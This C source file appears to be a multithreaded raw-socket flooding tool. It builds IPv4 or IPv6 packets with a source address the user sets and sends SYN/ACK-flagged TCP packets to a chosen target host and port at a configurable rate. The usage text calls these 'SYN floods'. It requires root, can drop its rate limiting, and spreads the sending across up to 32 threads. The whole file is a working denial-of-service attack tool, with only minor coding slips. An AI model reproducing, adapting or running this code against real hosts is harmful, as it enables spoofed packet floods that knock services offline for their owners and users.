#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>
#include <linux/byteorder/little_endian.h>

#include "raw_socket.h"

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long u64;

#define  BASE_PORT	10000
#define  BUF_LEN	1524

#define NIPQUAD(addr) \
	((unsigned char *)&addr)[0], \
	((unsigned char *)&addr)[1], \
	((unsigned char *)&addr)[2], \
	((unsigned char *)&addr)[3]

u16 g_usIpId = 1;

int is_ipv6 = 0;
int sin6_scope_id = -1;

bool no_sleep = false;

unsigned char tcp_opt[8]={0x02, 0x04, 0x05, 0xb4, 0x01, 0x01, 0x04, 0x02};

void BuildIP(struct iphdr * iph, u16 len, u32 src_ip, u32 dst_ip)
{
	iph->ihl	= 5;
	iph->version	= 4;
	iph->tos	= 0;
	iph->tot_len	= htons(len);
	iph->id		= (++g_usIpId)|0x8000;
	iph->frag_off	= 0;
	iph->ttl	= 128;
	iph->protocol	= IPPROTO_TCP;
	iph->check	= 0;
	iph->saddr	= src_ip;
	iph->daddr	= dst_ip;
}

void BuildIPv6(struct ip6_hdr *ip6, u32 len, struct in6_addr saddr, struct in6_addr daddr)
{
	ip6->ip6_flow	= 0;
	ip6->ip6_plen	= htons(len - sizeof(struct ip6_hdr));
	ip6->ip6_nxt	= IPPROTO_TCP;
	ip6->ip6_hlim	= 64;
	ip6->ip6_vfc	= 0x60;
	ip6->ip6_src	= saddr;
	ip6->ip6_dst	= daddr;
}

void BuildTcp(struct tcphdr *tcph, u16 src_port, u16 dst_port, u16 tcph_len)
{
	tcph->source	= htons(src_port);	/* source port */
	tcph->dest	= htons(dst_port);	/* destination port */
	tcph->seq	= htonl(31337);
	tcph->doff	= tcph_len >> 2;
	tcph->ack_seq	= 0;
	tcph->syn	= 1;
	tcph->ack	= 1;
	tcph->window	= htons(57344);
}

bool parse_arg(int argc, char** argv, char *src_ip, char *src_ip_end, char *dst_ip, u16 *dst_port, u32 * unit_count, int *pn)
{
	int flags = 0;
	char c;

	while ((c = getopt(argc, argv, "s:e:d:n:t:p:c:i")) != -1)
	{
		switch (c) {
		case 's':
			flags |= 0x1;
			snprintf(src_ip, 100, "%s", optarg);
			break;
		case 'e':
			snprintf(src_ip_end, 100, "%s", optarg);
			break;
		case 'd':
			flags |= 0x2;
			snprintf(dst_ip, 100, "%s", optarg);
			break;
		case 'n':
			flags |= 0x4;
			*unit_count = (u32)atoi(optarg);
			break;
		case 'p':
			flags |= 0x8;
			*dst_port = (u16)atoi(optarg);
			break;
		case 'i':
			no_sleep = true;
			break;
		case 't':
			*pn = atoi(optarg);
			break;
		case 'c':
			sin6_scope_id = atoi(optarg);
			break;
		case '?':
			flags |= 0x10;
			fprintf(stderr, "Unrecognized option  \n");
			break;
		}
	}

	if (!(flags & 0x2))
		return false;
	else
		return true;
}

char src_ip[128];
char src_ip_e[128] = {0};
char dst_ip[128];
u16 dst_port = 80, src_port = 12345;
u32 unit_count = 1;

u16 csum_fold(__wsum csum)
{
	u32 sum = (u32)csum;
	sum = (sum & 0xffff) + (sum >> 16);
	sum = (sum & 0xffff) + (sum >> 16);
	return (u16)~sum;
}

__wsum csum_tcpudp_nofold(__be32 saddr, __be32 daddr,
				   unsigned short len,
				   unsigned short proto,
				   __wsum sum)
{
	unsigned long result;

	result = (u64)saddr + (u64)daddr +
		 (u64)sum + ((len + proto) << 8);

	/* Fold down to 32-bits so we don't lose in the typedef-less
	   network stack.  */
	/* 64 to 33 */
	result = (result & 0xffffffff) + (result >> 32);
	/* 33 to 32 */
	result = (result & 0xffffffff) + (result >> 32);
	return (__wsum)result;
}

void *run(void *arg)
{
	char datagram[BUF_LEN];
	struct sockaddr_in6 from_addr = {0};
	struct sockaddr_in6 to_addr = {0};
	struct ip6_hdr *iph6 = (struct ip6_hdr *)datagram;
	struct iphdr *iph = (struct iphdr *)datagram;
	int iplen;
	struct tcphdr *tcph;
	char *opt;
	int tcphdr_size;
	int pkt_len;

	if (is_ipv6) {
		iplen = sizeof(struct ip6_hdr);
	} else {
		iplen = sizeof(struct iphdr);
	}
	tcph = (struct tcphdr *)(datagram + iplen);
	opt = datagram + iplen + sizeof(struct tcphdr);

	memset (datagram, 0, BUF_LEN);

	tcphdr_size = sizeof(struct tcphdr) + sizeof(tcp_opt);
	pkt_len = tcphdr_size + iplen;


	u32 src_ip0 = inet_addr(src_ip), src_ip1 = inet_addr(src_ip_e);

	if (src_ip1 == (u32)(-1))
		src_ip1 = src_ip0;
	else if (ntohl(src_ip0) > ntohl(src_ip1))
		src_ip1 = src_ip0;

	printf ("thread %2d: src %s - %d.%d.%d.%d dst %s port %d , is_ipv6 %d, count %d /second\n", *((int*)arg), src_ip, NIPQUAD(src_ip1), dst_ip, dst_port, is_ipv6, unit_count);

	memcpy(opt, tcp_opt, sizeof(tcp_opt));
	BuildTcp(tcph, src_port, dst_port, tcphdr_size);
	if (is_ipv6) {
		inet_pton(AF_INET6, src_ip, &from_addr.sin6_addr);
		inet_pton(AF_INET6, dst_ip, &to_addr.sin6_addr);
		BuildIPv6(iph6, pkt_len, from_addr.sin6_addr, to_addr.sin6_addr);
	} else {
		BuildIP(iph, pkt_len, src_ip0, inet_addr(dst_ip));
	}

	struct timeval tpstart, tpend;
	int timeuse, i, time;
	CWsRawSocket &sRawSocket = CWsRawSocket::Instance();

	while (1)
	{
		gettimeofday(&tpstart, NULL);
		//u32 send_count=0, ul=ntohl(src_ip0), ip_end=ntohl(src_ip1);
		u32 send_count=0, ul=1, ip_end=1;
		while (ul <= ip_end)
		{
			//iph->saddr = htonl(ul);
			++ul;
			for (i = 0; i < (int)unit_count; i++) {
				++src_port;
				if (src_port == 0xFFFF)
					src_port = BASE_PORT;
				tcph->source = htons (src_port);
				//tcph->dest = htons(src_port);

				if (is_ipv6) {
					sRawSocket.SendRawDataIpv6(datagram, pkt_len, sin6_scope_id);
				} else {
					sRawSocket.SendRawData(datagram, pkt_len);
				}

				++send_count;
			}
		}
		gettimeofday(&tpend, NULL);
		timeuse = 1000000 * (tpend.tv_sec - tpstart.tv_sec) + tpend.tv_usec - tpstart.tv_usec;
		if (no_sleep == false) {
			time = 1000000 - timeuse;
			if (time > 0)
				usleep(time);
		}
		printf("thread %2d: send count %u, unit count %u, use time %d ms\n", *((int*)arg), send_count, unit_count, timeuse/1000);
	}
	return (void*)1;
}

int pn = 1;
pthread_t thread[32];

int main(int argc, char** argv)
{
	int i, val[32];
	for (i=0;i<32;i++)
		val[i] = i+1;

	if (getuid ()) {
		fprintf (stderr, "Also, you must be root to run this program !\n");
		return -1;
	}

	snprintf (src_ip, 16, "%s", "192.168.8.12");

	if (parse_arg(argc, argv, src_ip, src_ip_e, dst_ip, &dst_port, &unit_count, &pn) == false) {
		fprintf (stderr, "\n%s -s <source ip> -d <destination ip> -p <port> -n <count of SYN floods/second> -t <pthread num>\n", argv[0]);
		fprintf (stderr, "You must give me a destination\n");
		fprintf (stderr," Example:\n\t\t./%s -s 192.168.1.81 -d 192.168.1.71 -p 80 -n 1\n", argv[0]);
		fprintf (stderr," Example:\n\t\t./%s -s fe80::800:27ff:fe00:0 -d fe80::a00:27ff:fefb:cae5 -v 4 -p 80 -n 1\n", argv[0]);
		fprintf (stderr, "ipv6 must set sin6_scope_id, use -c sin6_scope_id, sin6_scope_id from `ip addr show`\n");
		return -2;
	}
	for (i = 0; src_ip[i] ; i ++)
		if (src_ip[i] == ':')
			is_ipv6 = 1;
	for (i = 0; dst_ip[i] ; i ++)
		if (dst_ip[i] == ':')
			is_ipv6 = 1;
	if (is_ipv6 && sin6_scope_id < 0) {
		printf("ipv6 must set sin6_scope_id, use -c sin6_scope_id, sin6_scope_id from `ip addr show`\n");
		return -3;
	}

	if (pn < 0 || pn > 32) {
		printf("pn = %d, reset pn=1\n", pn);
		pn = 1;
	}
	for (i=0;i<pn;i++)
		pthread_create(&thread[0], NULL, run, &val[i]);
	for (i=0;i<pn;i++)
		pthread_join(thread[0], NULL);
	return 0;
}

